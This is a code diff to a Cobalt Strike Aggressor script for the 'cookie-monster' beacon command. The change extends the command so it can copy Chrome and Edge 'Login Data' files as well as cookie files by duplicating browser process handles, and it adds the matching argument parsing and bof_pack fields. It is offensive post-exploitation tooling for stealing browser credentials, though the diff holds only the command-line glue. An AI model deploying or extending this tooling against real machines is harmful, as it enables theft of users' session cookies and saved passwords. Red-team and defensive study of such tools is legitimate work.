@@ -9,19 +9,23 @@
 beacon_command_register(
 "cookie-monster",
 "Locate and copy the cookie file used for Edge/Chrome/Firefox",
-"Usage: cookie-monster [ --chrome || --edge || --firefox || --chromepid <pid> || --edgepid <pid> ] \
+"Usage: cookie-monster [--chrome || --edge || --firefox || --chromeCookiePID <pid> || --chromeLoginDataPID <PID> || --edgeCookiePID <pid> || --edgeLoginDataPID <pid> ] \
 cookie-monster Example: \
    cookie-monster --chrome \
    cookie-monster --edge \
    cookie-moster --firefox \
-   cookie-monster --chromepid 1337 \
-   cookie-monster --edgepid 4444 \
+   cookie-monster --chromeCookiePID 1337 \
+   cookie-monster --chromeLoginDataPID 1337 \
+   cookie-monster --edgeCookiePID 4444 \
+   cookie-monster --edgeLoginDataPID 4444 \
 cookie-monster Options: \
     --chrome, looks at all running processes and handles, if one matches chrome.exe it copies the handle to cookies and then copies the file to the CWD \
     --edge, looks at all running processes and handles, if one matches msedge.exe it copies the handle to cookies and then copies the file to the CWD \
     --firefox, looks for profiles.ini and locates the key4.db and logins.json file \
-    --chromepid, if chrome PID is provided look for the specified process with a handle to cookies is known, specifiy the pid to duplicate its handle and cookie file \
-    --edgepid, if edge PID is provided look for the specified process with a handle to cookies is known, specifiy the pid to duplicate its handle and cookie file \
+    --chromeCookiePID, if chrome PID is provided look for the specified process with a handle to cookies is known, specifiy the pid to duplicate its handle and file \
+    --chromeLoginDataPID, if chrome PID is provided look for the specified process with a handle to Login Data is known, specifiy the pid to duplicate its handle and file \  
+    --edgeCookiePID, if edge PID is provided look for the specified process with a handle to cookies is known, specifiy the pid to duplicate its handle and file \
+    --edgeLoginDataPID, if edge PID is provided look for the specified process with a handle to Login Data is known, specifiy the pid to duplicate its handle and file \ 
     ");
 
 # $1 - beacon id
@@ -45,8 +49,10 @@ alias cookie-monster {
     $chrome = 1;
     $edge = 1;
     $firefox = 1;
-    $chromepid = 1;
-    $edgepid = 1;
+    $chromeCookiePID = 1;
+    $chromeLoginDataPID = 1;
+    $edgeCookiePID = 1;
+    $edgeLoginDataPID = 1;
     $pid = 1;
 
     for ($i = 1; $i < size(@_); $i++)
@@ -63,17 +69,16 @@ alias cookie-monster {
         {
             $firefox = 0;
         }
-        else if (@_[$i] eq "--chromepid")
+        else if (@_[$i] eq "--chromeCookiePID")
         {
-            $chromepid = 0;
+            $chromeCookiePID = 0;
             # get PID
             $i++;
             if($i >= size(@_))
             {
-                berror($1, "missing --chromepid PID value");
+                berror($1, "missing --chromeCookiePID PID value");
                 return;
             }
-            # set the revert time
             $pid = @_[$i];
             if(!-isnumber $pid || $pid eq "1")
                 {
@@ -81,17 +86,50 @@ alias cookie-monster {
                     return;
                 }
         }
-        else if (@_[$i] eq "--edgepid")
+        else if (@_[$i] eq "--chromeLoginDataPID")
         {
-            $edgepid = 0;
+            $chromeLoginDataPID = 0;
             # get PID
             $i++;
             if($i >= size(@_))
             {
-                berror($1, "missing --edgepid PID value");
+                berror($1, "missing --chromeLoginDataPID PID value");
                 return;
             }
-            # set the revert time
+            $pid = @_[$i];
+            if(!-isnumber $pid || $pid eq "1")
+                {
+                    berror($1, "Invalid PID: " . $pid);
+                    return;
+                }
+        }
+        else if (@_[$i] eq "--edgeCookiePID")
+        {
+            $edgeCookiePID = 0;
+            # get PID
+            $i++;
+            if($i >= size(@_))
+            {
+                berror($1, "missing --edgeCookiePID PID value");
+                return;
+            }
+            $pid = @_[$i];
+            if(!-isnumber $pid || $pid eq "1")
+                {
+                    berror($1, "Invalid PID: " . $pid);
+                    return;
+                }
+        }
+        else if (@_[$i] eq "--edgeLoginDataPID")
+        {
+            $edgeLoginDataPID = 0;
+            # get PID
+            $i++;
+            if($i >= size(@_))
+            {
+                berror($1, "missing --edgeLoginDataPID PID value");
+                return;
+            }
             $pid = @_[$i];
             if(!-isnumber $pid || $pid eq "1")
                 {
@@ -105,12 +143,12 @@ alias cookie-monster {
         }
     }
 
-    if ( $chrome == 1 && $edge == 1 && $firefox == 1 && $chromepid == 1 && $edgepid == 1 && $pid == 1){
+    if ( $chrome == 1 && $edge == 1 && $firefox == 1 && $chromeCookiePID == 1 && $chromeLoginDataPID == 1 && $edgeCookiePID == 1 && $edgeLoginDataPID == 1 && $pid == 1){
         berror($1, "NO OPTIONS SELECTED");
         return;
     }
     
-    $args = bof_pack($1, "iiiiii", $chrome, $edge, $firefox, $chromepid, $edgepid, $pid );
+    $args = bof_pack($1, "iiiiiiii", $chrome, $edge, $firefox, $chromeCookiePID, $chromeLoginDataPID, $edgeCookiePID, $edgeLoginDataPID, $pid );
     beacon_inline_execute($1, $data, "go", $args);
 
 }
